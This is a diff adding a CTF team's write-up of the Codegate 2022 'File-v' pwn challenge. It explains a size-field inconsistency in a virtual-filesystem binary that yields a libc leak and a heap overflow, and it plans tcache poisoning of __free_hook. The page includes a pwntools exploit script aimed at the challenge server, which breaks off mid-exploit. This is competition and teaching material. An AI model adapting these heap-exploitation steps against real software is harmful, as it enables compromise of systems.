@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>File-v | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="File-v" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/Codegate-2022-quals/pwn/filev.html" />
+<meta property="og:url" content="https://org.anize.rs/Codegate-2022-quals/pwn/filev.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="File-v" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"File-v","url":"https://org.anize.rs/Codegate-2022-quals/pwn/filev.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="file-v">File-v</h1>
+
+<p><strong>Authors</strong>: Peace-Maker, pql</p>
+
+<p><strong>Tags:</strong> pwn</p>
+
+<p><strong>Points:</strong> 957 (12 solves)</p>
+
+<p><strong>Description:</strong></p>
+
+<blockquote>
+  <p>Thanks for using J-DRIVE!!!!</p>
+</blockquote>
+
+<p>The challenge binary implements a virtual filesystem where you could create and manage
+“files” in memory through a console menu smelling like an heap challenge. The process
+forked right away and let the child and parent process communicate through local sockets.
+The parent process provided the user interface which lets the user explore the virtual
+filesystem and send “system calls” through to the child process, which kept the actual
+list of virtual files.</p>
+
+<h4 id="overview">Overview</h4>
+<p>After reversing both the parent process, we come to the following vfile struct, which
+is created and filled with user provided data in the client itself. So the parent process
+always keeps one copy of a “selected” vfile in memory to change the metadata and file content
+of before committing it to the child process when asked to.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">vfile_format</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">total_size</span><span class="p">;</span> <span class="c1">// filename_size + filesize + 25</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">color_idx</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">created_time</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">modified_time</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">filename_size</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">filesize</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">filename</span><span class="p">[];</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>The client process opens a <code class="language-plaintext highlighter-rouge">flag.v</code> and <code class="language-plaintext highlighter-rouge">README.md.v</code> file on start and links it into a global
+doubly-linked list where the parent process can append and delete files from. The struct looks
+something like this, but we only needed the parent process for our exploit.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">vfile</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">vfile_format</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">vfile</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">vfile</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>You can select and print that <code class="language-plaintext highlighter-rouge">flag.v</code> file through the client menu, but it only tells you to
+get a shell to read the real <code class="language-plaintext highlighter-rouge">flag</code> file.</p>
+
+<h4 id="the-bug">The Bug</h4>
+<p>When editing a virtual file’s contents, the <code class="language-plaintext highlighter-rouge">total_size</code> field isn’t updated [1] but only the
+<code class="language-plaintext highlighter-rouge">filesize</code> field is [4]. Since the two fields were used in different contexts in the logic,
+the inconsistency first allowed us to leak a libc address.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">"Enter content: "</span><span class="p">);</span>
+<span class="n">new_content</span> <span class="o">=</span> <span class="n">read_line</span><span class="p">(</span><span class="n">filesize</span><span class="p">);</span>
+<span class="n">total_size</span> <span class="o">=</span> <span class="n">selected_vfile</span><span class="o">-&gt;</span><span class="n">total_size</span><span class="p">;</span>               <span class="c1">// [1]</span>
+<span class="n">new_content2</span> <span class="o">=</span> <span class="n">new_content</span><span class="p">;</span>
+<span class="n">new_filestruct</span> <span class="o">=</span> <span class="p">(</span><span class="n">vfile_format</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">selected_vfile</span><span class="o">-&gt;</span><span class="n">total_size</span> <span class="o">-</span> <span class="n">selected_vfile</span><span class="o">-&gt;</span><span class="n">filesize</span> <span class="o">+</span> <span class="n">filesize</span><span class="p">);</span>   <span class="c1">// [2]</span>
+<span class="n">memcpy</span><span class="p">(</span><span class="n">new_filestruct</span><span class="p">,</span> <span class="n">selected_vfile</span><span class="p">,</span> <span class="n">total_size</span><span class="p">);</span>    <span class="c1">// [3]</span>
+<span class="n">new_filestruct</span><span class="o">-&gt;</span><span class="n">modified_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
+<span class="n">filename_size</span> <span class="o">=</span> <span class="n">new_filestruct</span><span class="o">-&gt;</span><span class="n">filename_size</span><span class="p">;</span>
+<span class="n">new_filestruct</span><span class="o">-&gt;</span><span class="n">filesize</span> <span class="o">=</span> <span class="n">filesize</span><span class="p">;</span>                   <span class="c1">// [4]</span>
+<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">new_filestruct</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">[</span><span class="n">filename_size</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="n">new_content2</span><span class="p">,</span> <span class="n">filesize</span><span class="p">);</span>
+<span class="n">free</span><span class="p">(</span><span class="n">selected_vfile</span><span class="p">);</span>
+<span class="n">free</span><span class="p">(</span><span class="n">new_content2</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h4 id="the-exploit">The Exploit</h4>
+<p>When changing the content of an existing file like <code class="language-plaintext highlighter-rouge">flag.v</code> to some longer value and saving it
+to the child process, the <code class="language-plaintext highlighter-rouge">total_size</code> field is used to determine the size of the struct and
+thus truncates it on the child process. After loading the same file again, the smaller <code class="language-plaintext highlighter-rouge">total_size</code>
+is used to <code class="language-plaintext highlighter-rouge">malloc</code> a buffer for it. Printing the contents of a file uses the larger <code class="language-plaintext highlighter-rouge">filesize</code> field
+and leaks the heap memory after the <code class="language-plaintext highlighter-rouge">vfile_format</code> struct containing libc addresses.</p>
+
+<p>To turn this into an arbitrary write primitive, we created a file with longer content and correct
+large <code class="language-plaintext highlighter-rouge">total_size</code> set. Then edit the contents again to a smaller value. We <code class="language-plaintext highlighter-rouge">malloc</code> a smaller
+chunk in [2], but still <code class="language-plaintext highlighter-rouge">memcpy</code> the whole old struct over the smaller buffer. [3]
+This allowed us to overflow the heap buffer and into another free tcache chunk we placed there
+through some heap fengshui. The target chunk had to be smaller than 0x100 in size, since we’ll
+use the filename as a trigger which had that size limit.</p>
+
+<p>To actually fix up the <code class="language-plaintext highlighter-rouge">total_size</code> field after changing the contents we resorted to changing
+the filename, since that menu option recalculated and updated the <code class="language-plaintext highlighter-rouge">total_size</code> to match the
+set <code class="language-plaintext highlighter-rouge">filesize</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">total_size</span> <span class="o">=</span> <span class="n">file_data_struct</span><span class="o">-&gt;</span><span class="n">filesize</span> <span class="o">+</span> <span class="n">new_filename_len</span> <span class="o">+</span> <span class="mi">25</span><span class="p">;</span>
+<span class="n">new_vfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">vfile_format</span> <span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">total_size</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
+<span class="n">new_vfile</span><span class="o">-&gt;</span><span class="n">total_size</span> <span class="o">=</span> <span class="n">total_size</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Since we’re dealing with libc 2.27, which lacks tcache sanity checks, the plan was to plant
+<code class="language-plaintext highlighter-rouge">__free_hook</code> into the <code class="language-plaintext highlighter-rouge">fd</code> field of a free tcache chunk to let <code class="language-plaintext highlighter-rouge">malloc</code> return that address
+and overwrite it with a magic gadget to get a shell. A lot of the logic used <code class="language-plaintext highlighter-rouge">calloc</code> to
+allocate memory though, which doesn’t use the tcache. So many steps of the exploit dance
+around this limitation by using the few controllable <code class="language-plaintext highlighter-rouge">malloc</code> calls repeatedly.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># context.terminal = ["terminator", "-e"]
+</span>
+<span class="n">BINARY_NAME</span> <span class="o">=</span> <span class="s">"./file-v-new"</span>
+<span class="n">LIBC_NAME</span> <span class="o">=</span> <span class="s">"./libc.so"</span>
+<span class="n">REMOTE</span> <span class="o">=</span> <span class="p">(</span><span class="s">"3.36.184.9"</span><span class="p">,</span> <span class="mi">5555</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">BINARY_NAME</span>
+<span class="n">binary</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_NAME</span><span class="p">)</span>
+
+<span class="n">EXEC_STR</span> <span class="o">=</span> <span class="p">[</span><span class="n">binary</span><span class="p">.</span><span class="n">path</span><span class="p">]</span>
+
+<span class="n">PIE_ENABLED</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">pie</span>
+
+<span class="n">BREAKPOINTS</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">args</span><span class="p">.</span><span class="n">BREAK</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)]</span> <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">BREAK</span> <span class="k">else</span> <span class="p">[]</span>
+
+<span class="n">gdbscript_break</span> <span class="o">=</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s">"brva </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">BREAKPOINTS</span><span class="p">])</span>
+
+<span class="n">gdbscript</span> <span class="o">=</span> \
+        <span class="s">"""
+        # GDBSCRIPT here
+        set follow-fork-mode parent
+        continue
+        """</span>
+
+
+<span class="k">def</span> <span class="nf">handle</span><span class="p">():</span>
+    
+    <span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">}</span>
+    
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="o">*</span><span class="n">REMOTE</span><span class="p">)</span>
+    
+    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+            <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">EXEC_STR</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript_break</span> <span class="o">+</span> <span class="n">gdbscript</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">EXEC_STR</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">error</span><span class="p">(</span><span class="s">"No argument supplied.</span><span class="se">\n</span><span class="s">Usage: python exploit.py (REMOTE|LOCAL) [GDB] [STRACE]"</span><span class="p">)</span> 
+    
+    <span class="c1"># if args.STRACE:
+</span>    <span class="c1">#     subprocess.Popen([*context.terminal, f"strace -p {p.pid}; cat"])
+</span>    <span class="c1">#     input("Waiting for enter...")
+</span>    
+    <span class="k">return</span> <span class="n">p</span>
+
+<span class="k">def</span> <span class="nf">recvmenu</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">do_create_file</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">filename_len</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="n">recvmenu</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">filename_len</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">filename_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+
+    <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'c'</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Enter the length of filename:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">filename_len</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Enter filename: "</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">do_select_file</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+    <span class="n">recvmenu</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'b'</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Enter filename: "</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="sa">b</span><span class="s">'Failed to find the file</span><span class="se">\n</span><span class="s">'</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">None</span>
+    
+    <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Filename     </span><span class="se">\t\t</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">filename</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">Size         </span><span class="se">\t\t</span><span class="s">"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">Created  Time</span><span class="se">\t\t</span><span class="s">"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">created_time</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">Modified Time</span><span class="se">\t\t</span><span class="s">"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">modified_time</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">-------------------------------------------------------</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="p">{</span>
+        <span class="s">"filename"</span><span class="p">:</span> <span class="n">filename</span><span class="p">,</span>
+        <span class="s">"size"</span><span class="p">:</span> <span class="n">size</span><span class="p">,</span>
+        <span class="s">"created_time"</span><span class="p">:</span> <span class="n">created_time</span><span class="p">,</span>
+        <span class="s">"modified_time"</span><span class="p">:</span> <span class="n">modified_time</span>
+    <span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">select_do_change_name</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">filename_size</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">filename_size</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">filename_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+
+    <span class="n">recvmenu</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Enter the length of filename: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">filename_size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Enter filename: "</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">select_do_change_content</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">content_size</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+
+    <span class="k">if</span> <span class="n">content_size</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">content_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+    <span class="n">recvmenu</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"4"</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Enter the size of content: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">content_size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Enter content: "</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">select_do_get_content</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
+    <span class="n">recvmenu</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
+
+    <span class="n">results</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">' | '</span><span class="p">)</span>
+        
+        <span class="n">bs</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'|'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">decode</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">bs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">break</span>
+
+        <span class="n">bs</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="n">bs</span><span class="p">))</span>
+        <span class="n">results</span> <span class="o">+=</span> <span class="n">bs</span>
+
+        <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">results</span>
+
+
+<span class="k">def</span> <span class="nf">select_do_save_changes</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
+    <span class="n">recvmenu</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">select_do_back</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">save</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="n">recvmenu</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'b'</span><span class="p">)</span>
+    <span class="n">n</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+    <span class="c1"># print('=====', n)
+</span>    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="sa">b</span><span class="s">"Won't"</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">save</span><span class="p">:</span>
+            <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'Y'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'N'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">select_do_delete</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
+    <span class="n">recvmenu</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'d'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">l</span> <span class="o">=</span> <span class="n">handle</span><span class="p">()</span>
+
+    <span class="n">l</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"-------------------------- MENU ---------------------------"</span><span class="p">)</span>
+    
+    <span class="nb">file</span> <span class="o">=</span> <span class="n">do_select_file</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">"flag"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
+
+    <span class="n">select_do_change_content</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span>
+    <span class="n">select_do_save_changes</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="n">select_do_back</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+
+    <span class="n">do_select_file</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">"flag"</span><span class="p">)</span>
+
+    <span class="n">oobr</span> <span class="o">=</span> <span class="n">select_do_get_content</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+    <span class="c1"># print(hexdump(oobr))
+</span>
+    <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">oobr</span><span class="p">[</span><span class="mh">0xab</span><span class="p">:</span><span class="mh">0xab</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'libc leak: %#x'</span><span class="p">,</span> <span class="n">libc_leak</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3ec680</span> <span class="c1"># libc.sym._IO_2_1_stderr_
+</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc base: %#x"</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">)</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
+
+    <span class="n">select_do_back</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+
+    <span class="n">do_create_file</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="sa">b</span><span class="s">'H'</span><span class="o">*</span><span class="mh">0xc0</span><span class="p">)</span>
